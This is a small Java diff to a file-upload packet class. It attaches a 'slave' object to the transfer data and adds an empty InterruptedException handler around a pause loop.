@@ -31,6 +31,7 @@ public class Packet42ServerUploadFile extends AbstractOutgoingPacket {
 			data.setRemoteFile(remoteFile);
 			data.setLocalFile(file);
 			data.setTotal(file.length());
+			data.setObject(slave);
 			
 			data.setRunnable(new TransferRunnable(data) {
 				public void run() {
@@ -42,6 +43,8 @@ public class Packet42ServerUploadFile extends AbstractOutgoingPacket {
 							if (pause) {
 								try {
 									Thread.sleep(Long.MAX_VALUE);
+								} catch (InterruptedException e) {
+
 								} catch (Exception e) {
 									e.printStackTrace();
 								}
